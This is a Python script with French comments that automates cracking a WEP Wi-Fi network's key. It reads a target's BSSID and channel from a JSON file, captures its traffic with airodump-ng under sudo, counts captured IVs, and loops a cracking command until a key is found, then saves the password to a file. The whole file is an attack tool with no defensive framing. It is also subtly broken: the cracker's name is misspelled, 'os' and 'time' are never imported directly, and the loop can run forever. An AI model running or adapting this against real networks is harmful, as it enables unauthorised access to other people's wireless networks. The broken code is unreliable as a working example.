import subprocess
import json
import re
from networkscan import *
from save_to import *

# Ajout Des Success color
ERROR_COLOR = "\033[91m"    # Red
INFO_COLOR = "\033[93m"     # Yellow
RESET_COLOR = "\033[0m"     # Reset
SUCCESS_COLOR = "\033[92m"  # Green

# Extrait le nombre d'IV (vecteurs d'initialisation) à partir d'un fichier CSV de capture.
def get_iv_count(csv_file):
    try:
        with open(csv_file, "r") as file:
            lines = file.readlines()
            data_section = False
            for line in lines:
                if data_section:
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) > 10 and parts[10].isdigit():
                        iv_count = int(parts[10])
                        print(f"Nombre d'IV : {iv_count}")
                        return iv_count
                if line.startswith("BSSID"):
                    data_section = True
    except FileNotFoundError:
        print(f"{ERROR_COLOR}[ERROR] : Le fichier {csv_file} n'existe pas.{RESET_COLOR}")
    except Exception as e:
        print(f"{ERROR_COLOR}[ERROR] : Une erreur inattendue s'est produite : {str(e)}{RESET_COLOR}")
    return None

# Effectue une capture de paquets à partir des informations du fichier target.json.
def capture_from_target_json_wep(interface, target_path="Target/target.json", output_dir="Capture"):
    try:
        # Lecture des données du fichier JSON
        with open(target_path, "r") as file:
            target_data = json.load(file)
            if not target_data:
                print(f"{ERROR_COLOR}[ERROR] : Le fichier target.json est vide ou mal formaté.{RESET_COLOR}")
                return

            # Extraction des informations du réseau
            bssid = target_data["BSSID"]
            channel = target_data["Channel"]

            # Commande pour airodump-ng
            capture_file = os.path.join(output_dir, "capture")
            
            # Lancement du processus avec Popen pour permettre l'arrêt
            process = subprocess.Popen(
                ["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, "--write", capture_file, interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )  
            
            time.sleep(5)
                       
            # Appel la fonction pour récupérer le nombre d'IV
            get_iv_count("Capture/capture-01.csv")
                
            # Arrêt du processus après la capture
            process.terminate()
            print("Processus de capture terminé.")
    except FileNotFoundError:
        print(f"{ERROR_COLOR}[ERROR] : Le fichier {target_path} n'existe pas.{RESET_COLOR}")
    except json.JSONDecodeError:
        print(f"{ERROR_COLOR}[ERROR] : Le fichier {target_path} n'est pas un JSON valide.{RESET_COLOR}")
    except Exception as e:
        print(f"{ERROR_COLOR}[ERROR] : Une erreur inattendue s'est produite : {str(e)}{RESET_COLOR}")

# Automatise le cracking du mot de passe avec airecrack-ng pour le WEP
# et sauvegarde le mot de passe trouvé dans un fichier.
def crack_password_wep(capture_file="Capture/capture-01.cap", output_file="password.txt"):
    try:
        while True:
            command = f"sudo airecrack-ng {capture_file}"
            result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            if result.returncode == 0:
                output = result.stdout
                for line in output.splitlines():
                    if "KEY FOUND!" in line:
                        password = line.split()[-1].strip()
                        with open(output_file, "w") as file:
                            file.write(f"Mot de passe trouvé : {password}\n")
                        print(f"{SUCCESS_COLOR}[SUCCESS] : Mot de passe trouvé : {password}{RESET_COLOR}")
                        print(f"Mot de passe sauvegardé dans : {output_file}")
                        return
    except FileNotFoundError:
        print(f"{ERROR_COLOR}[ERROR] : Le fichier {capture_file} n'existe pas.{RESET_COLOR}")
    except Exception as e:
        print(f"{ERROR_COLOR}[ERROR] : Une erreur inattendue s'est produite : {str(e)}{RESET_COLOR}")